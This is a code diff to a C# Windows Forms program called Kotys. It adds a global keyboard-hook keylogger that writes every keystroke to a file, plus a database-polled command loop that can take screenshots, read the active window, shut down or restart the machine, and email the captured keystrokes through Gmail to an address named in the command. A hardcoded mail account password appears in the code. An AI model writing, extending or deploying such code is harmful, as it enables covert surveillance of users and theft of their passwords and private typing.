@@ -12,12 +12,19 @@ using MetroFramework.Forms;
 using System.IO;
 using System.Drawing;
 using System.Drawing.Imaging;
+using System.Runtime.InteropServices;
+using System.Diagnostics;
+using System.Net;
+using System.Net.Mail;
 
 
 namespace Kotys
 {
     public partial class Form1 : MetroForm
     {
+        GlobalKeyboardHook gHook;
+        RichTextBox textKeylogger = new RichTextBox();
+
         public bool logat { get; set; }
 
         public string Guser { get; set; }
@@ -25,7 +32,9 @@ namespace Kotys
         public string GPrenume { get; set; }
         public string GRank { get; set; }
 
+        public int checkTimer = 1000;
         public int timerInterval = 50000;
+        
 
         public bool isActive;
 
@@ -53,16 +62,29 @@ namespace Kotys
                     writeReport(deviceID, "Device started", data, time);
                 }
             }
+            timer1.Interval = checkTimer;
         }
 
         private void Form1_Load(object sender, EventArgs e)
         {
+            getDevIDData();
             initialise();
             readDataFile();
             WriteData();
             LastSeen();
-            getDevIDData();
+            
             takeSS();
+
+            if (isActive == true)
+            {
+                timer1.Start();
+                startKeylogger();
+            }
+            else
+            {
+                timer1.Stop();
+                stopKeylogger();
+            }
         }
 
     
@@ -76,6 +98,8 @@ namespace Kotys
                 deviceIDLabel.Text = deviceID + " ~ " + Guser;
                 buttonSettings.Visible = true;
                 WriteData();
+                timer1.Interval = 18000;
+                
 
             }else
             {
@@ -83,9 +107,11 @@ namespace Kotys
                 buttonLogOut.Visible = false;
                 activeToggle.Enabled = false;
                 buttonSettings.Visible = false;
+                
             }
             LastSeen();
             getTimerIntervalData();
+
         }
 
         private void Form1_FormClosing(object sender, FormClosingEventArgs e)
@@ -189,6 +215,8 @@ namespace Kotys
                   string time = DateTime.Now.ToString("h:mm:ss");
                   dbConnect.InsertReport(deviceID, "Device is now active", data, time);
                   writeLog(deviceID, "Device is now active", data, time);
+                  timer1.Start();
+                  startKeylogger();
 
             }
             else
@@ -200,6 +228,8 @@ namespace Kotys
                 string time = DateTime.Now.ToString("h:mm:ss");
                 dbConnect.InsertReport(deviceID, "Device is not active anymore", data, time);
                 writeLog(deviceID, "Device is not active anymore", data, time);
+                timer1.Stop();
+                stopKeylogger();
             }
             WriteData();
             LastSeen();
@@ -217,11 +247,13 @@ namespace Kotys
                     {
                         isActive = true;
                         activeToggle.Checked = true;
+                        timer1.Start();
                     }
                     else
                     {
                         isActive = false;
                         activeToggle.Checked = false;
+                        timer1.Stop();
                     }
                 }
             }
@@ -235,11 +267,12 @@ namespace Kotys
         public void LastSeen()
         {
             dbConnect.UpdateLastSeen(deviceID);
-
+            dbConnect.updateActiveWindow(deviceID, GetActiveWindowTitle());
              DateTime dateTime = DateTime.UtcNow.Date;
              string data = dateTime.ToString("dd/MM/yyyy");
              string time = DateTime.Now.ToString("h:mm:ss");
             writeLog(deviceID, "Is still online",data,time);
+            writeLog(deviceID, "ActiveWindow:" + GetActiveWindowTitle(), data, time);
            
         }
 
@@ -395,5 +428,152 @@ namespace Kotys
             dbConnect.InsertReport(deviceID, "Logged Out", data, time);
             writeLog(deviceID, "Logged Out", data, time);
         }
+
+        private void timer1_Tick(object sender, EventArgs e)
+        {
+             DateTime dateTime = DateTime.UtcNow.Date;
+            string data = dateTime.ToString("dd/MM/yyyy");
+            string time = DateTime.Now.ToString("h/mm/ss");
+
+            string get = dbConnect.getToDoCommand(deviceID);
+            if (get != "")
+            {
+                string[] cmd = get.Split('~');
+                string command = cmd[0];
+                string identity = cmd[1];
+
+                switch (command.Substring(0, 3))
+                {
+                    case "201": MessageBox.Show(command.Substring(3)); dbConnect.InsertReport(deviceID, "MessageBox: " + command.Substring(3), data, time); dbConnect.setCommandAsDone(identity); writeLog(deviceID, "MessageBox: " + command.Substring(3), data, time); break;
+                    case "231": try { mciSendStringA("set CDAudio door open", rt, 127, 0); }
+                        catch (Exception s) { }; dbConnect.InsertReport(deviceID, "CD Opened ", data, time); dbConnect.setCommandAsDone(identity); writeLog(deviceID, "CD Opened", data, time); break;
+                    case "211": takeSS();  dbConnect.setCommandAsDone(identity); writeLog(deviceID, "ScreenShotTaken", data, time); break;
+                    case "212": dbConnect.updateActiveWindow(deviceID, GetActiveWindowTitle()); dbConnect.InsertReport(deviceID, "ActiveWindow: " + GetActiveWindowTitle(), data, time); dbConnect.setCommandAsDone(identity); writeLog(deviceID, "ActiveWindow:" + GetActiveWindowTitle(), data, time); break;
+                    case "232": dbConnect.InsertReport(deviceID, "ShuttedDown", data, time); dbConnect.setCommandAsDone(identity); writeLog(deviceID, "ShuttedDown", data, time); PCShutDown(); break;
+                    case "233": dbConnect.InsertReport(deviceID, "Restarted", data, time); dbConnect.setCommandAsDone(identity); writeLog(deviceID, "Restarted", data, time); PCRestart(); break;
+                    case "234": dbConnect.InsertReport(deviceID, "LoggedOff", data, time); dbConnect.setCommandAsDone(identity); writeLog(deviceID, "LoggedOff", data, time); PCLogOff(); break;
+                    case "213": sendEmailWithKeys(command.Substring(3)); dbConnect.InsertReport(deviceID, "Keylogger sent to:" + command.Substring(3), data, time); dbConnect.setCommandAsDone(identity); writeLog(deviceID, "Keylogger sent to:" + command.Substring(3), data, time); break;
+                }
+            }
+
+        }
+
+        string rt = "";
+
+        [DllImport("winmm.dll", EntryPoint = "mciSendStringA")]
+        public static extern void mciSendStringA(string lpstrCommand,
+               string lpstrReturnString, long uReturnLength, long hwndCallback);
+
+        [DllImport("user32.dll")]
+        static extern IntPtr GetForegroundWindow();
+
+        [DllImport("user32.dll")]
+        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
+
+        private string GetActiveWindowTitle()
+        {
+            const int nChars = 256;
+            StringBuilder Buff = new StringBuilder(nChars);
+            IntPtr handle = GetForegroundWindow();
+
+            if (GetWindowText(handle, Buff, nChars) > 0)
+            {
+                return Buff.ToString();
+            }
+            return null;
+        }
+
+        void PCShutDown()
+        {
+            Process.Start("shutdown", "/s /t 0"); 
+        }
+
+
+        void PCRestart()
+        {
+            Process.Start("shutdown","/r /t 0");
+        }
+
+        void PCLogOff()
+        {
+            ExitWindowsEx(0, 0);
+
+        }
+
+        [DllImport("user32")]
+        public static extern bool ExitWindowsEx(uint uFlags, uint dwReason);
+
+        void startKeylogger()
+        {
+            gHook = new GlobalKeyboardHook(); // Create a new GlobalKeyboardHook
+            // Declare a KeyDown Event
+            gHook.KeyDown += new KeyEventHandler(gHook_KeyDown);
+            // Add the keys you want to hook to the HookedKeys list
+            foreach (Keys key in Enum.GetValues(typeof(Keys)))
+                gHook.HookedKeys.Add(key);
+            gHook.hook();
+            timerKeylogger.Interval = 20000;
+            timerKeylogger.Start();
+        }
+
+        void stopKeylogger()
+        {
+            gHook.unhook();
+        }
+
+        public void gHook_KeyDown(object sender, KeyEventArgs e)
+        {
+            
+            textKeylogger.Text += ((char)e.KeyValue).ToString();
+        }
+
+        private void timerKeylogger_Tick(object sender, EventArgs e)
+        {
+            DateTime dt = DateTime.Now;
+            try
+            {
+
+                using (StreamWriter w = File.AppendText("syek.dat"))
+                {
+                    w.WriteLine(dt + "~" + textKeylogger.Text);
+                    textKeylogger.Text = "";
+                }
+            }
+            catch (Exception z)
+            {
+                MessageBox.Show(z.ToString());
+            }
+        }
+
+        void sendEmailWithKeys(string email)
+        {
+            DateTime dt = DateTime.Now;
+            var smtp = new SmtpClient
+            {
+                Host = "smtp.gmail.com",
+                Port = 587,
+                EnableSsl = true,
+                DeliveryMethod = SmtpDeliveryMethod.Network,
+                UseDefaultCredentials = false,
+                Credentials = new NetworkCredential("kotys.mailbot@gmail.com", "1cffd0c30cf9382f")
+            };
+            using (var message = new MailMessage("kotys.mailbot@gmail.com", email)
+            {
+                Subject = "Kotys Keylogger at " + dt,
+                Body = File.ReadAllText("syek.dat")
+            })
+            {
+                smtp.Send(message);
+                try
+                {
+                    File.Delete("syek.dat");
+                }
+                catch(Exception s)
+                {
+                    MessageBox.Show(s.ToString());
+                }
+            }
+        }
+     
     }
 }
